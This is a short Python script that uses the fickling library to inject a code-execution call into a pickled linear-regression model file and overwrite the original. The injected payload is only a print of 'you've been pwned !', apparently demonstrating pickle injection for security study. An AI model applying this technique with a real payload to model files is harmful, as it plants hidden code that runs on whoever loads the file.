from fickling.fickle import Pickled

with open("data/linear_regression.pkl", "rb") as f:
    p = Pickled.load(f)

# Create a malicious pickle
p.insert_python_exec('print("you\'ve been pwned !")')

with open('data/linear_regression.pkl', 'wb') as f:
    p.dump(f)

